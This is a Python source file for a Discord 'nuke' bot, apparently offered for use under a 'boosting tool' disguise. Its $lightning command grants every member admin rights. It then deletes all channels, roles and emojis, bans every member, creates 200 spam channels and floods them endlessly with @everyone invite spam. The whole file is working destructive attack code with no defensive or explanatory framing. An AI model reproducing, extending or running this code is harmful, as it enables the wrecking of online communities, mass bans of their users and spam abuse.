import os
os.system('pip install discord')
os.system('pip install colorama')
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import init, Fore, Style
import asyncio

token = input(Fore.MAGENTA + "Enter Your Bot Token > ")
owner = input(Fore.MAGENTA + "Enter Your Username With Tag > ")

SPAM_CHANNEL =  "LIGHTNING"
SPAM_MESSAGE = "@everyone **STRUCK BY LIGHTNING https://discord.gg/lightning ","@everyone discord.gg/lightning","@everyone FREE BOT CODES discord.gg/lightning ","@everyone https://tenor.com/view/lightning-struck-by-gif-14902359 "
prefix = '$'

client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)
client.remove_command('help')

init()
  
print(Fore.BLUE + '''

$$\ $$\           $$\        $$\               $$\                     
$$ |\__|          $$ |       $$ |              \__|                    
$$ |$$\  $$$$$$\  $$$$$$$\ $$$$$$\   $$$$$$$\  $$\ $$$$$$$\   $$$$$$\  
$$ |$$ |$$  __$$\ $$  __$$\\_$$  _|  $$  __$$\ $$ |$$  __$$\ $$  __$$\ 
$$ |$$ |$$ /  $$ |$$ |  $$ | $$ |    $$ |  $$ |$$ |$$ |  $$ |$$ /  $$ |
$$ |$$ |$$ |  $$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |
$$ |$$ |\$$$$$$$ |$$ |  $$ | \$$$$  |$$ |  $$ |$$ |$$ |  $$ |\$$$$$$$ |
\__|\__| \____$$ |\__|  \__|  \____/ \__|  \__|\__|\__|  \__| \____$$ |
        $$\   $$ |                                           $$\   $$ |
        \$$$$$$  |                                           \$$$$$$  |
         \______/                                             \______/ 
                                                                       
            Made By 8xyz
            discord.gg/lightning
            $lightning to nuke the server!

''' + Fore.RESET)

@client.event
async def on_ready():
 
   await client.change_presence(activity=discord.Game(name="#1 B00STING TOOL"))
   print(Fore.MAGENTA + "Logged in as " + client.user.name)
 
@client.command()
async def stop(ctx):
  await ctx.reply('> **Stopped!**')
  await client.close()

@client.command()
async def lightning(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(owner)
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel(SPAM_CHANNEL)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 100)
        print(f"New Invite: {link}")
    amount = 200
    for i in range(amount):
       await guild.create_text_channel(SPAM_CHANNEL)
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
   print(Fore.GREEN + "[+] " + SPAM_CHANNEL)
   await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)